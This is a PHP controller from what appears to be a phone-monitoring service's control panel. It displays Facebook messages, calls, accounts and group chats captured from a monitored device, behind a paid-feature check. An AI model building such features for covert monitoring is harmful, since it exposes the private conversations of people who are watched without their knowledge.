<?php

namespace Controllers;

use System\FlashMessages,
    Models\Modules,
    CS\Devices\Limitations;

class Facebook extends BaseModuleController
{

    protected $module = Modules::FACEBOOK;

    protected function init()
    {
        parent::init();

        $this->initCP();
    }

    public function indexAction()
    {
        $facebookModel = new \Models\Cp\Facebook($this->di);

        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            if (isset($this->params['tab']) && $this->params['tab'] == 'calls') {
                $data = $facebookModel->getCallsDataTableData(
                        $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo')), $this->di['currentDevice']['os']
                );
                $this->checkDisplayLength($dataTableRequest->getDisplayLength());
                $this->makeJSONResponse($data);
            } else {
                $data = $facebookModel->getMessagesDataTableData(
                        $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
                );
                $this->checkDisplayLength($dataTableRequest->getDisplayLength());
                $this->makeJSONResponse($data);
            }
        }

        $this->view->callsTab = ($this->di['currentDevice']['os'] === 'android' && $this->di['currentDevice']['app_version'] >= 9) ||
                ($this->di['currentDevice']['os'] === 'ios' && $this->di['currentDevice']['app_version'] >= 7);
        
        if ($this->view->paid) {
            $this->view->accounts = $facebookModel->getAccountsList($this->di['devId']);
        }

        $this->setView('cp/facebook/index.htm');
    }

    public function listAction()
    {
        $facebookModel = new \Models\Cp\Facebook($this->di);

        if ($this->getRequest()->isAjax()) {
            
            $currPage = ($this->getRequest()->hasPost('currPage') && $this->getRequest()->post('currPage') > 0) ? $this->getRequest()->post('currPage') : 0;
            $perPage = ($this->getRequest()->hasPost('perPage') && $this->getRequest()->post('perPage') > 0) ? $this->getRequest()->post('perPage') : $this->lengthPage;
            $search = ($this->getRequest()->hasPost('search')) ? $this->getRequest()->post('search') : false;
            
            $data = array();
            if($this->params['tab'] == 'private')
                $data = $facebookModel->getItemsPrivateList($this->di['devId'], $this->params['account'], $this->params['id'], $search, $currPage, $perPage);
            
            if($this->params['tab'] == 'group')
                $data = $facebookModel->getItemsGroupList($this->di['devId'], $this->params['account'], $this->params['id'], $search, $currPage, $perPage);
            
            $this->makeJSONResponse($data);
        }
        
        $dialogueExists = false;
        
        switch ($this->params['tab']) {
            case 'group':
                $dialogueExists = $facebookModel->isGroupDialogueExists($this->di['devId'], $this->params['account'], $this->params['id']);
                $this->view->users = $facebookModel->getGroupUsers($this->di['devId'], $this->params['account'], $this->params['id']);
                break;

            case 'private':
                $accountName = $facebookModel->getAccountName($this->di['devId'], $this->params['account'], $this->params['id']);
                if ($accountName !== false) {
                    $this->view->accountName = $accountName;
                    $this->view->accountId = $this->params['id'];
                    $dialogueExists = true;
                }
                break;
        }

        if (!$dialogueExists) {
            $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('The dialogue has not been found!'));
            $this->redirect($this->di['router']->getRouteUrl('facebook'));
        }

        $this->view->tab = $this->params['tab'];
        $this->view->id = $this->params['id'];
        $this->view->account = $this->params['account'];        

        $this->setView('cp/facebook/list.htm');
    }

    protected function postAction()
    {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Facebook');
    }

    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::FACEBOOK);
    }

}
